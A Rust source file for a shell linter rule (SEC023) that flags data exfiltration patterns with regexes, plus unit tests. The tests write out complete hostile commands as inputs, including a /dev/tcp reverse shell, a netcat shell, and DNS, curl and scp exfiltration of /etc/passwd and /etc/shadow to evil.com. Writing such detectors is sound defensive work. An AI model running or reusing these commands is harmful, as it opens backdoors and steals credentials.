//! SEC023: Data Exfiltration Patterns
//!
//! **Rule**: Detect patterns that exfiltrate data from the system:
//! reverse shells, DNS exfiltration, netcat backdoors, posting secrets
//! to external services, scp to unknown hosts.

use crate::linter::{Diagnostic, LintResult, Severity, Span};
use std::sync::LazyLock;

static RE_REVERSE_SHELL: LazyLock<regex::Regex> = LazyLock::new(|| {
    regex::Regex::new(r"(?:bash|sh)\s+-i\s+>&?\s*/dev/tcp/").expect("valid regex")
});

static RE_NC_SHELL: LazyLock<regex::Regex> = LazyLock::new(|| {
    regex::Regex::new(r"nc\s+-[elp]+\s+/bin/(?:sh|bash)").expect("valid regex")
});

static RE_DNS_EXFIL: LazyLock<regex::Regex> = LazyLock::new(|| {
    regex::Regex::new(r"nslookup\s+\$").expect("valid regex")
});

static RE_CURL_POST_SECRETS: LazyLock<regex::Regex> = LazyLock::new(|| {
    regex::Regex::new(r"curl\s+.*-[dX].*(?:/etc/(?:shadow|passwd)|\.ssh/)").expect("valid regex")
});

static RE_SCP_EXFIL: LazyLock<regex::Regex> = LazyLock::new(|| {
    regex::Regex::new(r"scp\s+/etc/(?:passwd|shadow)\s").expect("valid regex")
});

/// Check for data exfiltration patterns.
pub fn check(source: &str) -> LintResult {
    let mut diagnostics = Vec::new();

    for (line_num, line) in source.lines().enumerate() {
        let ln = line_num + 1;

        if RE_REVERSE_SHELL.is_match(line) {
            diagnostics.push(Diagnostic::new(
                "SEC023",
                Severity::Error,
                "Reverse shell via /dev/tcp — remote access backdoor",
                Span::new(ln, 1, ln, line.len()),
            ));
        }

        if RE_NC_SHELL.is_match(line) {
            diagnostics.push(Diagnostic::new(
                "SEC023",
                Severity::Error,
                "Netcat reverse shell — remote command execution",
                Span::new(ln, 1, ln, line.len()),
            ));
        }

        if RE_DNS_EXFIL.is_match(line) {
            diagnostics.push(Diagnostic::new(
                "SEC023",
                Severity::Error,
                "DNS exfiltration — data leak via DNS queries",
                Span::new(ln, 1, ln, line.len()),
            ));
        }

        if RE_CURL_POST_SECRETS.is_match(line) {
            diagnostics.push(Diagnostic::new(
                "SEC023",
                Severity::Error,
                "Posting sensitive files to external service — data exfiltration",
                Span::new(ln, 1, ln, line.len()),
            ));
        }

        if RE_SCP_EXFIL.is_match(line) {
            diagnostics.push(Diagnostic::new(
                "SEC023",
                Severity::Error,
                "SCP of sensitive files — credential exfiltration",
                Span::new(ln, 1, ln, line.len()),
            ));
        }
    }

    LintResult { diagnostics }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_reverse_shell() {
        let diags = check("bash -i >& /dev/tcp/10.0.0.1/4242 0>&1").diagnostics;
        assert!(!diags.is_empty());
        assert_eq!(diags[0].code, "SEC023");
    }

    #[test]
    fn test_nc_shell() {
        let diags = check("nc -e /bin/sh 10.0.0.1 4242").diagnostics;
        assert!(!diags.is_empty());
    }

    #[test]
    fn test_dns_exfil() {
        let diags = check("data=$(cat /etc/passwd | base64); nslookup $data.evil.com").diagnostics;
        assert!(!diags.is_empty());
    }

    #[test]
    fn test_curl_post_secrets() {
        let diags = check("curl -X POST -d @/etc/shadow https://evil.com/collect").diagnostics;
        assert!(!diags.is_empty());
    }

    #[test]
    fn test_scp_exfil() {
        let diags = check("scp /etc/passwd attacker@evil.com:/loot/").diagnostics;
        assert!(!diags.is_empty());
    }

    #[test]
    fn test_safe_curl() {
        let diags = check("curl https://example.com/api/health").diagnostics;
        assert!(diags.is_empty(), "Normal curl should be safe");
    }

    #[test]
    fn test_safe_scp() {
        let diags = check("scp ./deploy.tar.gz user@server:/app/").diagnostics;
        assert!(diags.is_empty(), "Normal scp should be safe");
    }
}
